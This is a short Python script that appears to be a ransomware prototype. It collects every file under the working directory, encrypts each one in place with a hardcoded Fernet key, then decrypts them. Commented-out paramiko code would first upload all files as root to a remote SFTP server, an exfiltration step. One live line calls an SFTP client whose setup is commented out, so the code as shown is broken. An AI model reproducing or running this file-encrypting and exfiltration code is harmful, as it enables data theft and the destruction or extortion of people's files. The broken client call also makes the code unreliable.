#!/usr/bin/env python3
import os
import paramiko
from cryptography.fernet import Fernet

# ssh server
#ssh = paramiko.SSHClient()
#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#ssh.connect(hostname='', username='root', password='', port=22)
#sftp_client=ssh.open_sftp()

# find targets
targets = []
for (root, dirs, files) in os.walk(os.getcwd(), topdown=True):
    sftp_client.chdir(root)
    #print(sftp_client.getcwd())
    print(root)
    for file in files:
        if file != "encrypt.py":
            targets.append(root+'/'+file)
            #print('/root/recieve'+root+'/'+file)
            #sftp_client.put(file, '/root/recieve'+root+'/'+file)
    #sftp_client.chdir('/root')
    #print(sftp_client.getcwd())

# key
key = b'Fzh0I3_PYxI2nZqLjLJEOMDoROxG-Op-AQRNymU110Y='

# transfer data
#sftp_client.put('militech.txt', '/root/recieve/militech.txt')
#for target in targets:
#       sftp_client.put(target, '/root/recieve'+target)
#sftp_client.close()
#ssh.close()

# encrypt targets
for target in targets:
    with open(target, "rb") as thetarget:
        contents = thetarget.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(target, "wb") as thetarget:
        thetarget.write(contents_encrypted)

# decrypt targets
for target in targets:
    with open(target, "rb") as thetarget:
        contents = thetarget.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(target, "wb") as thetarget:
        thetarget.write(contents_decrypted)
